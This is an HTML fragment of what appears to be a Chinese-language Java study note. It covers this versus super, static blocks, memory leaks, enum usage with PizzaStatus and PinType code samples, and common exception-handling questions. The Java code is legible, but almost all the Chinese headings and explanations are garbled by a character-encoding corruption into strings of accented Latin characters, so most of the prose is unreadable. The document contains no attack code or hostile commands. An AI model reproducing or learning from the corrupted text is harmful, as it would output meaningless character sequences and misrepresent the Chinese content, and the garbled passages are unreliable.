<h3 id="thiså’Œsuperçš„åŒºåˆ«"><a href="#thiså’Œsuperçš„åŒºåˆ«" class="headerlink" title="thiså’Œsuperçš„åŒºåˆ«"></a>thiså’Œsuperçš„åŒºåˆ«</h3><p>ä¸å¯ä»¥åœ¨staticç¯å¢ƒä¸­ç”¨; thisæ˜¯ä¸€ä¸ªæŒ‡å‘æœ¬å¯¹è±¡çš„æŒ‡é’ˆ,superæ˜¯ä¸€ä¸ªjavaå…³é”®å­—; éƒ½éœ€è¦æ”¾åˆ°æ–¹æ³•çš„ç¬¬ä¸€è¡Œ; thiså’Œsuperä¸èƒ½åŒæ—¶å‡ºç°åœ¨ä¸€ä¸ªæ„é€ å‡½æ•°é‡Œé¢, å› ä¸ºthiså¿…ç„¶ä¼šè°ƒç”¨å…¶ä»–çš„æ„é€ å‡½æ•°, å…¶ä»–çš„æ„é€ å‡½æ•°å¿…ç„¶ä¼šæœ‰superè¯­å¥çš„å­˜åœ¨; </p>
<h4 id="é™æ€ä»£ç å—"><a href="#é™æ€ä»£ç å—" class="headerlink" title="é™æ€ä»£ç å—"></a>é™æ€ä»£ç å—</h4><p>å®šä¹‰åœ¨ç±»ä¸­æ–¹æ³•å¤–,é™æ€ä»£ç å—åœ¨éé™æ€ä»£ç å—ä¹‹å‰æ‰§è¡Œ(é™æ€ä»£ç å— - éé™æ€ä»£ç å— - æ„é€ æ–¹æ³•). è¯¥ç±»ä¸ç®¡åˆ›å»ºå¤šå°‘å¯¹è±¡,é™æ€ä»£ç å—åªæ‰§è¡Œä¸€æ¬¡. ä¸€ä¸ªç±»ä¸­å¯ä»¥æœ‰å¤šä¸ªé™æ€ä»£ç å—,ä½ç½®å¯ä»¥éšä¾¿æ”¾,å®ƒä¸åœ¨ä»»ä½•çš„æ–¹æ³•ä½“å†…,JVMåŠ è½½ç±»æ—¶ä¼šæ‰§è¡Œè¿™äº›é™æ€ä»£ç å—,å¦‚æœé™æ€ä»£ç å—æœ‰å¤šä¸ª,JVMå°†æŒ‰å®ƒä»¬çš„å…ˆåé¡ºåºæ‰§è¡Œ,æ¯ä¸ªä»£ç å—åªä¼šæ‰§è¡Œä¸€æ¬¡.</p>
<p><strong>é™æ€ä»£ç å—å¯¹äºå®šä¹‰åœ¨å®ƒä¹‹åçš„é™æ€å˜é‡,å¯ä»¥èµ‹å€¼,ä½†ä¸èƒ½è®¿é—®.</strong></p>
<p>é™æ€ä»£ç å—å¯èƒ½åœ¨ç¬¬ä¸€æ¬¡newçš„æ—¶å€™æ‰§è¡Œï¼Œä½†ä¸ä¸€å®šåªåœ¨ç¬¬ä¸€æ¬¡newçš„æ—¶å€™æ‰§è¡Œã€‚æ¯”å¦‚é€šè¿‡ <code>Class.forName(&quot;ClassDemo&quot;)</code>åˆ›å»º Class å¯¹è±¡çš„æ—¶å€™ä¹Ÿä¼šæ‰§è¡Œã€‚</p>
<p>éé™æ€ä»£ç å—åœ¨æ¯newä¸€æ¬¡å°±æ‰§è¡Œä¸€æ¬¡ã€‚ éé™æ€ä»£ç å—å¯åœ¨æ™®é€šæ–¹æ³•ä¸­å®šä¹‰(ä¸è¿‡ä½œç”¨ä¸å¤§)ï¼›è€Œé™æ€ä»£ç å—ä¸è¡Œã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹,å¦‚æœæœ‰äº›ä»£ç æ¯”å¦‚ä¸€äº›é¡¹ç›®æœ€å¸¸ç”¨çš„å˜é‡æˆ–å¯¹è±¡å¿…é¡»åœ¨é¡¹ç›®å¯åŠ¨çš„æ—¶å€™å°±æ‰§è¡Œçš„æ—¶å€™,éœ€è¦ä½¿ç”¨é™æ€ä»£ç å—,è¿™ç§ä»£ç æ˜¯ä¸»åŠ¨æ‰§è¡Œçš„ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è®¾è®¡ä¸éœ€è¦åˆ›å»ºå¯¹è±¡å°±å¯ä»¥è°ƒç”¨ç±»ä¸­çš„æ–¹æ³•ï¼Œä¾‹å¦‚ï¼šArraysç±»ï¼ŒCharacterç±»ï¼ŒStringç±»ç­‰ï¼Œå°±éœ€è¦ä½¿ç”¨é™æ€æ–¹æ³•, ä¸¤è€…çš„åŒºåˆ«æ˜¯ é™æ€ä»£ç å—æ˜¯è‡ªåŠ¨æ‰§è¡Œçš„è€Œé™æ€æ–¹æ³•æ˜¯è¢«è°ƒç”¨çš„æ—¶å€™æ‰æ‰§è¡Œçš„. </p>
<h2 id="javaå†…å­˜æ³„æ¼"><a href="#javaå†…å­˜æ³„æ¼" class="headerlink" title="javaå†…å­˜æ³„æ¼"></a>javaå†…å­˜æ³„æ¼</h2><p>javaå¯¼è‡´å†…å­˜æ³„éœ²çš„åŸå› å¾ˆæ˜ç¡®ï¼šé•¿ç”Ÿå‘½å‘¨æœŸçš„å¯¹è±¡æŒæœ‰çŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡çš„å¼•ç”¨å°±å¾ˆå¯èƒ½å‘ç”Ÿå†…å­˜æ³„éœ²ï¼Œå°½ç®¡çŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡å·²ç»ä¸å†éœ€è¦ï¼Œä½†æ˜¯å› ä¸ºé•¿ç”Ÿå‘½å‘¨æœŸå¯¹è±¡æŒæœ‰å®ƒçš„å¼•ç”¨è€Œå¯¼è‡´ä¸èƒ½è¢«å›æ”¶ï¼Œä¾‹å¦‚threadLocalï¼Œè¿™å°±æ˜¯javaä¸­å†…å­˜æ³„éœ²çš„å‘ç”Ÿåœºæ™¯ã€‚</p>
<h2 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h2><p>Referenceï¼š<a href="https://www.baeldung.com/a-guide-to-java-enums">https://www.baeldung.com/a-guide-to-java-enums</a> </p>
<p><strong>ä»¥è¿™ç§æ–¹å¼å®šä¹‰çš„å¸¸é‡ä½¿ä»£ç æ›´å…·å¯è¯»æ€§ï¼Œå…è®¸è¿›è¡Œç¼–è¯‘æ—¶æ£€æŸ¥ï¼Œé¢„å…ˆè®°å½•å¯æ¥å—å€¼çš„åˆ—è¡¨ï¼Œå¹¶é¿å…ç”±äºä¼ å…¥æ— æ•ˆå€¼è€Œå¼•èµ·çš„æ„å¤–è¡Œä¸ºã€‚</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shuang.kou.enumdemo.enumtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PizzaStatus</span> &#123;</span><br><span class="line">    ORDERED,</span><br><span class="line">    READY, </span><br><span class="line">    DELIVERED; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„ä»£ç é¿å…äº†å®šä¹‰å¸¸é‡ï¼Œæˆ‘ä»¬å°†æ‰€æœ‰å’Œ pizza è®¢å•çš„çŠ¶æ€çš„å¸¸é‡éƒ½ç»Ÿä¸€æ”¾åˆ°äº†ä¸€ä¸ªæšä¸¾ç±»å‹é‡Œé¢ã€‚</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.name());<span class="comment">//ORDERED</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED);<span class="comment">//ORDERED</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.name().getClass());<span class="comment">//class java.lang.String</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.getClass());<span class="comment">//class shuang.kou.enumdemo.enumtest.PizzaStatus</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="è‡ªå®šä¹‰æšä¸¾æ–¹æ³•"><a href="#è‡ªå®šä¹‰æšä¸¾æ–¹æ³•" class="headerlink" title="è‡ªå®šä¹‰æšä¸¾æ–¹æ³•"></a>è‡ªå®šä¹‰æšä¸¾æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pizza</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> PizzaStatus status;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PizzaStatus</span> &#123;</span><br><span class="line">        ORDERED,</span><br><span class="line">        READY,</span><br><span class="line">        DELIVERED;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isDeliverable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getStatus() == PizzaStatus.READY;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// Methods that set and get the status variable.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨-x3D-x3D-æ¯”è¾ƒæšä¸¾ç±»å‹"><a href="#ä½¿ç”¨-x3D-x3D-æ¯”è¾ƒæšä¸¾ç±»å‹" class="headerlink" title="ä½¿ç”¨&#x3D;&#x3D;æ¯”è¾ƒæšä¸¾ç±»å‹"></a>ä½¿ç”¨&#x3D;&#x3D;æ¯”è¾ƒæšä¸¾ç±»å‹</h3><p>ç”±äºæšä¸¾ç±»å‹ç¡®ä¿JVMä¸­ä»…å­˜åœ¨ä¸€ä¸ªå¸¸é‡å®ä¾‹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å®‰å…¨åœ°ä½¿ç”¨ <code>==</code> è¿ç®—ç¬¦æ¯”è¾ƒä¸¤ä¸ªå˜é‡ï¼Œå¦‚ä¸Šä¾‹æ‰€ç¤ºï¼›æ­¤å¤–ï¼Œ<code>==</code> è¿ç®—ç¬¦å¯æä¾›ç¼–è¯‘æ—¶å’Œè¿è¡Œæ—¶çš„å®‰å…¨æ€§ã€‚</p>
<p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ä»¥ä¸‹ä»£ç æ®µä¸­çš„è¿è¡Œæ—¶å®‰å…¨æ€§ï¼Œå…¶ä¸­ <code>==</code> è¿ç®—ç¬¦ç”¨äºæ¯”è¾ƒçŠ¶æ€ï¼Œå¹¶ä¸”å¦‚æœä¸¤ä¸ªå€¼å‡ä¸ºnull éƒ½ä¸ä¼šå¼•å‘ NullPointerExceptionã€‚ç›¸åï¼Œå¦‚æœä½¿ç”¨equalsæ–¹æ³•ï¼Œå°†æŠ›å‡º NullPointerExceptionï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pizza.<span class="type">PizzaStatus</span> <span class="variable">pizza</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">System.out.println(pizza.equals(Pizza.PizzaStatus.DELIVERED));<span class="comment">//ç©ºæŒ‡é’ˆå¼‚å¸¸</span></span><br><span class="line">System.out.println(pizza == Pizza.PizzaStatus.DELIVERED);<span class="comment">//æ­£å¸¸è¿è¡ŒCopy to clipboardErrorCopied</span></span><br></pre></td></tr></table></figure>

<p>å¯¹äºç¼–è¯‘æ—¶å®‰å…¨æ€§ï¼Œæˆ‘ä»¬çœ‹å¦ä¸€ä¸ªç¤ºä¾‹ï¼Œä¸¤ä¸ªä¸åŒæšä¸¾ç±»å‹è¿›è¡Œæ¯”è¾ƒï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Pizza.PizzaStatus.DELIVERED.equals(TestColor.GREEN)); <span class="comment">// ç¼–è¯‘æ­£å¸¸</span></span><br><span class="line"><span class="keyword">if</span> (Pizza.PizzaStatus.DELIVERED == TestColor.GREEN);      <span class="comment">// ç¼–è¯‘å¤±è´¥ï¼Œç±»å‹ä¸åŒ¹é…</span></span><br></pre></td></tr></table></figure>

<h3 id="åœ¨Switchè¯­å¥ä¸­ä½¿ç”¨æšä¸¾ç±»å‹"><a href="#åœ¨Switchè¯­å¥ä¸­ä½¿ç”¨æšä¸¾ç±»å‹" class="headerlink" title="åœ¨Switchè¯­å¥ä¸­ä½¿ç”¨æšä¸¾ç±»å‹"></a>åœ¨Switchè¯­å¥ä¸­ä½¿ç”¨æšä¸¾ç±»å‹</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getDeliveryTimeInDays</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (status) &#123;</span><br><span class="line">        <span class="keyword">case</span> ORDERED:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">case</span> READY:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">case</span> DELIVERED:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€¦</p>
<h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PinType</span> &#123;</span><br><span class="line"></span><br><span class="line">    REGISTER(<span class="number">100000</span>, <span class="string">&quot;æ³¨å†Œä½¿ç”¨&quot;</span>),</span><br><span class="line">    FORGET_PASSWORD(<span class="number">100001</span>, <span class="string">&quot;å¿˜è®°å¯†ç ä½¿ç”¨&quot;</span>),</span><br><span class="line">    UPDATE_PHONE_NUMBER(<span class="number">100002</span>, <span class="string">&quot;æ›´æ–°æ‰‹æœºå·ç ä½¿ç”¨&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String message;</span><br><span class="line"></span><br><span class="line">    PinType(<span class="type">int</span> code, String message) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;PinType&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;code=&quot;</span> + code +</span><br><span class="line">                <span class="string">&quot;, message=&#x27;&quot;</span> + message + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å®é™…ä½¿ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.getCode());</span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.getMessage());</span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">100001</span></span><br><span class="line">å¿˜è®°å¯†ç ä½¿ç”¨</span><br><span class="line">PinType&#123;code=<span class="number">100001</span>, message=<span class="string">&#x27;å¿˜è®°å¯†ç ä½¿ç”¨&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Javaå¼‚å¸¸"><a href="#Javaå¼‚å¸¸" class="headerlink" title="Javaå¼‚å¸¸"></a>Javaå¼‚å¸¸</h1><p>åœ¨tryè¯­å¥å—ä¸­æœ‰é™¤æ•°ä¸º0çš„æ“ä½œï¼Œè¯¥æ“ä½œä¼šæŠ›å‡ºjava.lang.ArithmeticExceptionå¼‚å¸¸ã€‚é€šè¿‡catchï¼Œå¯¹è¯¥å¼‚å¸¸è¿›è¡Œæ•è·ã€‚<br>è§‚å¯Ÿç»“æœæˆ‘ä»¬å‘ç°ï¼Œå¹¶æ²¡æœ‰æ‰§è¡ŒSystem.out.println(â€œi&#x3D;â€+i)ã€‚è¿™è¯´æ˜tryè¯­å¥å—å‘ç”Ÿå¼‚å¸¸ä¹‹åï¼Œtryè¯­å¥å—ä¸­çš„å‰©ä½™å†…å®¹å°±ä¸ä¼šå†è¢«æ‰§è¡Œäº†ã€‚</p>
<p>æœ€ç»ˆä¸€å®šä¼šæ‰§è¡Œfinallyè¯­å¥å—ã€‚</p>
<h2 id="1-Error-å’Œ-Exception-åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-Error-å’Œ-Exception-åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1. Error å’Œ Exception åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"></a>1. Error å’Œ Exception åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>Error ç±»å‹çš„é”™è¯¯é€šå¸¸ä¸ºè™šæ‹Ÿæœºç›¸å…³é”™è¯¯ï¼Œå¦‚ç³»ç»Ÿå´©æºƒï¼Œå†…å­˜ä¸è¶³ï¼Œå †æ ˆæº¢å‡º ç­‰ï¼Œç¼–è¯‘å™¨ä¸ä¼šå¯¹è¿™ç±»é”™è¯¯è¿›è¡Œæ£€æµ‹ï¼ŒJAVA åº”ç”¨ç¨‹åºä¹Ÿä¸åº”å¯¹è¿™ç±»é”™è¯¯è¿›è¡Œæ• è·ï¼Œä¸€æ—¦è¿™ç±»é”™è¯¯å‘ç”Ÿï¼Œé€šå¸¸åº”ç”¨ç¨‹åºä¼šè¢«ç»ˆæ­¢ï¼Œä»…é åº”ç”¨ç¨‹åºæœ¬èº«æ— æ³•æ¢å¤ï¼› </p>
<p>Exception ç±»çš„é”™è¯¯æ˜¯å¯ä»¥åœ¨åº”ç”¨ç¨‹åºä¸­è¿›è¡Œæ•è·å¹¶å¤„ç†çš„ï¼Œé€šå¸¸é‡åˆ°è¿™ç§é”™è¯¯ï¼Œåº”å¯¹å…¶è¿›è¡Œå¤„ç†ï¼Œä½¿åº”ç”¨ç¨‹åºå¯ä»¥ç»§ç»­æ­£å¸¸è¿è¡Œã€‚ </p>
<h2 id="2-è¿è¡Œæ—¶å¼‚å¸¸å’Œä¸€èˆ¬å¼‚å¸¸-å—æ£€å¼‚å¸¸-åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#2-è¿è¡Œæ—¶å¼‚å¸¸å’Œä¸€èˆ¬å¼‚å¸¸-å—æ£€å¼‚å¸¸-åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="2. è¿è¡Œæ—¶å¼‚å¸¸å’Œä¸€èˆ¬å¼‚å¸¸(å—æ£€å¼‚å¸¸)åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"></a>2. è¿è¡Œæ—¶å¼‚å¸¸å’Œä¸€èˆ¬å¼‚å¸¸(å—æ£€å¼‚å¸¸)åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>è¿è¡Œæ—¶å¼‚å¸¸åŒ…æ‹¬ RuntimeException ç±»åŠå…¶å­ç±»ï¼Œè¡¨ç¤º JVM åœ¨è¿è¡ŒæœŸé—´å¯èƒ½å‡ºç°çš„å¼‚å¸¸ã€‚ Java ç¼–è¯‘å™¨ä¸ä¼šæ£€æŸ¥è¿è¡Œæ—¶å¼‚å¸¸ã€‚ </p>
<p>å—æ£€å¼‚å¸¸æ˜¯Exception ä¸­é™¤ RuntimeException åŠå…¶å­ç±»ä¹‹å¤–çš„å¼‚å¸¸ã€‚ Java ç¼–è¯‘å™¨ä¼šæ£€æŸ¥å—æ£€å¼‚å¸¸ã€‚ </p>
<p><strong>RuntimeExceptionå¼‚å¸¸å’Œå—æ£€å¼‚å¸¸ä¹‹é—´çš„åŒºåˆ«ï¼š</strong>æ˜¯å¦å¼ºåˆ¶è¦æ±‚è°ƒç”¨è€…å¿…é¡»å¤„ç†æ­¤å¼‚å¸¸ï¼Œå¦‚æœå¼ºåˆ¶è¦æ±‚è°ƒç”¨è€…å¿…é¡»è¿›è¡Œå¤„ç†ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨å—æ£€å¼‚å¸¸ï¼Œå¦åˆ™å°±é€‰æ‹©éå—æ£€å¼‚å¸¸(RuntimeException)ã€‚ä¸€èˆ¬æ¥è®²ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šçš„è¦æ±‚ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨RuntimeExceptionå¼‚å¸¸ã€‚ </p>
<h2 id="3-JVM-æ˜¯å¦‚ä½•å¤„ç†å¼‚å¸¸çš„ï¼Ÿ"><a href="#3-JVM-æ˜¯å¦‚ä½•å¤„ç†å¼‚å¸¸çš„ï¼Ÿ" class="headerlink" title="3. JVM æ˜¯å¦‚ä½•å¤„ç†å¼‚å¸¸çš„ï¼Ÿ"></a>3. JVM æ˜¯å¦‚ä½•å¤„ç†å¼‚å¸¸çš„ï¼Ÿ</h2><p>åœ¨ä¸€ä¸ªæ–¹æ³•ä¸­å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œå¹¶è½¬äº¤ç»™ JVMï¼Œ è¯¥å¼‚å¸¸å¯¹è±¡åŒ…å«å¼‚å¸¸åç§°ï¼Œå¼‚å¸¸æè¿°ä»¥åŠå¼‚å¸¸å‘ç”Ÿæ—¶åº”ç”¨ç¨‹åºçš„çŠ¶æ€ã€‚åˆ›å»ºå¼‚å¸¸ å¯¹è±¡å¹¶è½¬äº¤ç»™ JVM çš„è¿‡ç¨‹ç§°ä¸ºæŠ›å‡ºå¼‚å¸¸ã€‚å¯èƒ½æœ‰ä¸€ç³»åˆ—çš„æ–¹æ³•è°ƒç”¨ï¼Œç»ˆæ‰è¿›å…¥æŠ›å‡ºå¼‚å¸¸çš„æ–¹æ³•ï¼Œè¿™ä¸€ç³»åˆ—æ–¹æ³•è°ƒç”¨çš„æœ‰åºåˆ—è¡¨å«åšè°ƒç”¨æ ˆã€‚</p>
<p>JVM ä¼šé¡ºç€è°ƒç”¨æ ˆå»æŸ¥æ‰¾çœ‹æ˜¯å¦æœ‰å¯ä»¥å¤„ç†å¼‚å¸¸çš„ä»£ç ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è°ƒç”¨å¼‚å¸¸å¤„ç†ä»£ç ã€‚å½“ JVM å‘ç°å¯ä»¥å¤„ç†å¼‚å¸¸çš„ä»£ç æ—¶ï¼Œä¼šæŠŠå‘ç”Ÿçš„å¼‚å¸¸ä¼ é€’ç»™å®ƒã€‚å¦‚æœ JVM æ²¡æœ‰æ‰¾åˆ°å¯ä»¥å¤„ç†è¯¥å¼‚å¸¸çš„ä»£ç å—ï¼ŒJVM å°±ä¼šå°†è¯¥å¼‚å¸¸è½¬äº¤ç»™é»˜è®¤çš„å¼‚å¸¸å¤„ç†å™¨ï¼ˆé»˜è®¤å¤„ç†å™¨ä¸º JVM çš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œé»˜è®¤å¼‚å¸¸å¤„ç†å™¨æ‰“å°å‡ºå¼‚å¸¸ä¿¡æ¯å¹¶ç»ˆæ­¢åº”ç”¨ç¨‹åºã€‚ </p>
<h2 id="4-throw-å’Œ-throws-çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#4-throw-å’Œ-throws-çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="4. throw å’Œ throws çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"></a>4. throw å’Œ throws çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>Java ä¸­çš„å¼‚å¸¸å¤„ç†é™¤äº†åŒ…æ‹¬æ•è·å¼‚å¸¸å’Œå¤„ç†å¼‚å¸¸ä¹‹å¤–ï¼Œè¿˜åŒ…æ‹¬å£°æ˜å¼‚å¸¸å’Œæ‹‹å‡º å¼‚å¸¸ï¼Œå¯ä»¥é€šè¿‡ throws å…³é”®å­—åœ¨æ–¹æ³•ä¸Šå£°æ˜è¯¥æ–¹æ³•è¦æ‹‹å‡ºçš„å¼‚å¸¸ï¼Œæˆ–è€…åœ¨æ–¹æ³•å†…éƒ¨é€šè¿‡ throw æ‹‹å‡ºå¼‚å¸¸å¯¹è±¡ã€‚ </p>
<p>**throws å…³é”®å­—å’Œ throw å…³é”®å­—åœ¨ä½¿ç”¨ä¸Šçš„å‡ ç‚¹åŒºåˆ«å¦‚ä¸‹ï¼š **</p>
<ul>
<li>throw å…³é”®å­—ç”¨åœ¨æ–¹æ³•å†…éƒ¨ï¼Œåªèƒ½ç”¨äºæŠ›å‡ºä¸€ç§å¼‚å¸¸ï¼Œç”¨æ¥æŠ›å‡ºæ–¹æ³•æˆ–ä»£ç å—ä¸­çš„å¼‚å¸¸ï¼Œå—æŸ¥å¼‚å¸¸å’Œéå—æŸ¥å¼‚å¸¸éƒ½å¯ä»¥è¢«æŠ›å‡ºã€‚ </li>
<li>throws å…³é”®å­—ç”¨åœ¨æ–¹æ³•å£°æ˜ä¸Šï¼Œå¯ä»¥æŠ›å‡ºå¤šä¸ªå¼‚å¸¸ï¼Œç”¨æ¥æ ‡è¯†è¯¥æ–¹æ³•å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸åˆ—è¡¨ã€‚ä¸€ä¸ªæ–¹æ³•ç”¨ throws æ ‡è¯†äº†å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸åˆ—è¡¨ï¼Œè°ƒç”¨è¯¥æ–¹æ³•çš„æ–¹æ³•ä¸­å¿…é¡»åŒ…å«å¯å¤„ç†å¼‚å¸¸çš„ä»£ç ï¼Œå¦åˆ™ä¹Ÿè¦åœ¨æ–¹æ³•ç­¾åä¸­ç”¨ throws å…³é”®å­—å£°æ˜ç›¸åº”çš„å¼‚å¸¸ã€‚</li>
</ul>
<h2 id="5-finalã€finallyã€finalize-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#5-finalã€finallyã€finalize-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="5. finalã€finallyã€finalize æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>5. finalã€finallyã€finalize æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><ul>
<li>finalå¯ä»¥ä¿®é¥°ç±»ã€å˜é‡ã€æ–¹æ³•ï¼Œä¿®é¥°ç±»è¡¨ç¤ºè¯¥ç±»ä¸èƒ½è¢«ç»§æ‰¿ã€ä¿®é¥°æ–¹æ³•è¡¨ç¤ºè¯¥æ–¹æ³•ä¸èƒ½è¢«é‡å†™ã€ä¿®é¥°å˜é‡è¡¨ç¤ºè¯¥å˜é‡æ˜¯ä¸€ä¸ªå¸¸é‡ä¸èƒ½è¢«é‡æ–°èµ‹å€¼ã€‚ </li>
<li>finallyä¸€èˆ¬ä½œç”¨åœ¨try-catchä»£ç å—ä¸­ï¼Œåœ¨å¤„ç†å¼‚å¸¸çš„æ—¶å€™ï¼Œé€šå¸¸æˆ‘ä»¬å°†ä¸€å®šè¦æ‰§è¡Œçš„ä»£ç æ–¹æ³•finallyä»£ç å—ä¸­ï¼Œè¡¨ç¤ºä¸ç®¡æ˜¯å¦å‡ºç°å¼‚å¸¸ï¼Œè¯¥ä»£ç å—éƒ½ä¼šæ‰§è¡Œï¼Œä¸€èˆ¬ç”¨ æ¥å­˜æ”¾ä¸€äº›å…³é—­èµ„æºçš„ä»£ç ã€‚ </li>
<li>finalizeæ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œå±äºObjectç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œè€ŒObjectç±»æ˜¯æ‰€æœ‰ç±»çš„çˆ¶ç±»ï¼Œ Java ä¸­å…è®¸ä½¿ç”¨ finalize()æ–¹æ³•åœ¨åƒåœ¾æ”¶é›†å™¨å°†å¯¹è±¡ä»å†…å­˜ä¸­æ¸…é™¤å‡ºå»ä¹‹å‰åšå¿…è¦çš„æ¸…ç†å·¥ä½œã€‚ å¯ä»¥æ‰‹åŠ¨è°ƒç”¨ï¼Œä½†æ˜¯åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œè¿˜æ˜¯ä¼šè¢«è°ƒç”¨ã€‚</li>
</ul>
<h2 id="6-NoClassDefFoundError-å’Œ-ClassNotFoundException-åŒºåˆ«ï¼Ÿ"><a href="#6-NoClassDefFoundError-å’Œ-ClassNotFoundException-åŒºåˆ«ï¼Ÿ" class="headerlink" title="6. NoClassDefFoundError å’Œ  ClassNotFoundException åŒºåˆ«ï¼Ÿ"></a>6. NoClassDefFoundError å’Œ  ClassNotFoundException åŒºåˆ«ï¼Ÿ</h2><p>NoClassDefFoundError æ˜¯ä¸€ä¸ª Error ç±»å‹çš„å¼‚å¸¸ï¼Œæ˜¯ç”± JVM å¼•èµ·çš„ï¼Œä¸åº”è¯¥ å°è¯•æ•è·è¿™ä¸ªå¼‚å¸¸ã€‚ </p>
